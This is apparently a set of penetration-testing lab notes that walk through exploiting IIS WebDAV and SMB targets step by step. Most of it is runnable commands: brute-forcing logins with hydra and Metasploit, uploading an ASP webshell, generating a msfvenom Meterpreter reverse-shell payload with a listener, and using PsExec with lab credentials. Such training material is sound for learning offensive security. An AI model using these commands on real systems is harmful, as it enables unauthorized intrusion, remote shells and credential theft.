# Exploiting Microsoft IIS WebDAV

## Overview

This section details the process of exploiting a Microsoft IIS WebDAV server. It includes basic information about IIS and WebDAV, steps for identifying and exploiting WebDAV vulnerabilities, and a list of tools used in the process.

## Microsoft IIS

- **IIS (Internet Information Services)**: Proprietary web server software developed by Microsoft for the Windows NT family.
- **Usage**: Hosting websites and web applications with a robust GUI for managing them.
- **Supported File Types**: .asp, .aspx, .config, .php.
- **Ports**: Typically runs on port 80 (HTTP) or 443 (HTTPS with SSL certificate).

## WebDAV

- **WebDAV (Web-based Distributed Authoring and Versioning)**: Extensions to the HTTP protocol allowing collaborative file management on remote web servers.
- **Functionality**: Enables a web server to act as a file server.
- **Ports**: Operates on the same ports as IIS (80/443).
- **Authentication**: Requires legitimate credentials (username and password).

## WebDAV Exploitation

1. **Identification**: Determine if WebDAV is configured on the IIS server.
2. **Brute-force Attack**: Identify legitimate credentials for authentication.
3. **Exploitation**: Authenticate with the server and upload a malicious payload (e.g., .asp file) to execute commands or obtain a reverse shell.

## Tools

- **davtest**: Scans, authenticates, and exploits WebDAV servers. Pre-installed on offensive testing distros like Kali and Parrot.
- **cadaver**: Supports file operations (upload, download, delete) and resource locking on WebDAV servers. Also pre-installed on offensive testing distros.

## Credentials

| Username | Password         |
|----------|------------------|
| bob      | password_123321  |

## Basic Scans

1. **Initial Scan**: Identify open ports and services.

nmap -sV -sC 10.2.23.231

2. **Service Enumeration**: Identify directories and services on port 80.

`nmap -sV -p 80 --script=http-enum 10.2.23.231`
`Reveals the presence of the WebDAV directory.`

### Brute Force Authentication

`hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.23.231 http-get /webdav/`
Perform a brute-force attack on the WebDAV authentication form:

### Running davtest

1. **Without Authentication**:

davtest -url http://10.2.23.231/webdav
- Fails due to lack of authentication.

2. **With Authentication**:

davtest -auth bob
`-url http://10.2.23.231/webdav`
- Enumerates executable file formats and uploads to the /webdav directory.

### Uploading a .asp Backdoor

`cadaver http://10.2.23.231/webdav`
using cadaver

`put /usr/share/webshells/asp/webshell.asp`
Upload backdoor

3. **List directory**:

`ls`
- Confirms the upload of the backdoor.

### Exploiting the Backdoor

1. **Access Webshell**:
- Open the browser and navigate to `http://10.2.23.231/webdav/webshell.asp`.
2. **Execute Commands**:
- Example commands to list directory and view a file:

  `dir C:\`
  `type c:\flag.txt`

# Exploiting WebDAV with Metasploit

## Objective

In this section, we will exploit a WebDAV server running on IIS using Metasploit. The goal is to upload a malicious payload to the WebDAV directory and gain remote access to the target system. We'll cover the following steps:

1. **Credentials**: Accessing the WebDAV server with known credentials.
2. **Basic Scans**: Identifying the WebDAV service and configuring it.
3. **Obtaining a Reverse Shell**: Generating and uploading a payload using Metasploit.
4. **Alternative Method**: Using Metasploit's exploit modules for WebDAV.

## Credentials

| Username | Password         |
|----------|------------------|
| bob      | password_123321  |

## Basic Scans

1. **Identify WebDAV Directory**  
   `nmap -sV -p 80 --script=http-enum [target IP]`  
   This command scans for HTTP services on port 80 and enumerates available directories. It confirms that WebDAV is running on the IIS server.

2. **Access WebDAV Directory**  
   Access the WebDAV directory via a web browser to check if it is properly configured.

## Obtaining a Reverse Shell

### Generate Payload

1. **Create a Reverse Shell Payload**  
   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[eth1, own IP] LPORT=1234 -f asp > shell.asp`  
   `msfvenom` generates a Meterpreter reverse shell payload in ASP format. Replace `[eth1, own IP]` with your local IP address.

2. **List Files**  
   `ls`  
   Verify the generated payload file.

### Upload Payload Using Cadaver

1. **Upload Payload**  
   `cadaver http://[target IP]/webdav`  
   `put /root/shell.asp`  
   Upload the generated `shell.asp` to the WebDAV directory.

2. **List Files Again**  
   `ls`  
   Confirm the successful upload of the payload.

### Configure Metasploit Listener

1. **Start Metasploit Console**  
   `msfconsole`  
   Initialize Metasploit Framework.

2. **Setup Multi/Handler**  
   `msf6: service postgresql start && msfconsole`  
   Start PostgreSQL and Metasploit Console.

   `msf6: use multi/handler`  
   Select the multi/handler module for managing incoming connections.

   `msf6: set payload windows/meterpreter/reverse_tcp`  
   Set the payload type to reverse TCP Meterpreter.

   `msf6: show options`  
   Display available options for the selected payload.

   `msf6: set LHOST [eth1]`  
   Set your local IP address for the listener.

   `msf6: set LPORT 1234`  
   Set the port for the listener.

   `msf6: run`  
   Start the listener. When payload executes on target, it will connect back to this paticular tcp handler

3. **Execute Payload**  
   Navigate to the uploaded `shell.asp` file in a browser to execute it. This should establish a connection to your Metasploit listener. Now we get access to the target machine.

4. **Verify Access**  
   - `meterpreter > sysinfo`  
   - `meterpreter > getuid`  
   - `exit`: Terminates the current Meterpreter session.

5. **List Active Sessions**  
   - `sessions`  
   Check for active sessions and manage them as needed.

## Another Method

1. **Search for IIS Upload Exploit**  
   `msf6: search iis upload`  
   Look for available exploits related to IIS upload functionality.

2. **Use IIS WebDAV Upload Exploit**  
   `msf6: use exploit/windows/iis/iis_webdav_upload_asp`  
   Select the appropriate exploit module.

   `msf6: show options`  
   Review the options for the exploit module.

3. **Configure Exploit Settings**  
   - `msf6: set Httpusername bob`  
   - `msf6: set httpPassword password_123321`  
   - `msf6: set rhosts [target IP`  
   - `msf6: set rport 443 if target has SSL cert`  
   - `msf6: set PATH /webdav/metasploit.asp`  

   Set the necessary parameters for the exploit.

4. **Run Exploit**  
   `msf6: exploit`  
   Execute the exploit to gain remote access.

5. **Verify Access**  
   - `meterpreter > sysinfo`  
   - `meterpreter > getuid`  

   Confirm successful exploitation and access to the target system.

6. **Get the flag**
   `cd`
   `dir`
   `type flag.txt`

# Exploiting SMB with PsExec

- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files peripherals (printers and serial ports) between computer on a local network (LAN)
- SMB uses port 445 (tcp). However, originally, SMB ran on top of NetBIOS using port 139.
- Samba is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

## SMB Authentification
- SMB protocol utilizes two levels of authentication:
  - User Authentication
  - Share Authentication
 
- User authentication - Users must provide a username and password in order to authenicate with the SMB server in order to access a share.
- Share authentication - Users must provide a password in order to access restricted share
![grafik](https://github.com/user-attachments/assets/9e30510e-7ae2-41d2-a861-051db1be21ea)

## PsExec
- Lightweight telnet-replacement developed by Microsoft that allows us to execute processes on remote windows systems using any user's credentials
- PsExec authentication is performed via SMB
- We can use the PsExec utility to authenticate with the target system legitimaly and run arbitrary commands or launch a remote command prompt.
- It is very similar to RDP, however, instead of controlling the rmeote system via GUI, commands are sent via CMD
- In order to gain access to a Windows target, we need to identify legitimate user accounts and their respective passwords or password hashes. This can be done by using various tools and techniques. Most common technique will involve performing an SMB login brute-force attack.
- We can narrow down our brute-force attack to only include common windows user accounts like: Administrator
- After we have optained a legitimate user account and password, we cn use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.

## Demo: Exploiting SMB with PsExec

### Basic Scans:

`nmap -sV -sC  [target IP]`

SMB brute-force:
`service postgresql start && msfconsole`
  `search smb_login`
  `use auxiliar/scanner/smb/smb_login`
  RHOSTS needs to be set. RPORT is correct.
  `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
  `set PASS_FILE /usr/share/metasploit-framework/data/worldists/unix_passwords.txt`
  `set RHOSTS [target IP]`
  `show options`
  `set verbose: false`: don't give output from all attemps, only the successful one
  `run`

  New Tab

`pse`
`psexec.py` Python implementation which allows us to authenticate with target
`psexec.py Administrator @[target IP] cmd.exe`
`whoami`

  Old Tab
`psexec`: Will authenticate to target via SMB through psexec. Will upload meterpreter payload an execute it, provides us with a meterpreter session
`use exploit/windows/smb/psexec`
`show options`
`insert [target IP]`
`set smbuser Administrator`
`set SMBPass qwertyiop`
configure payload options
`exploit`
`sysinfo`
`getuid`

*Only malicous aspect is the payload.*

  
  










  
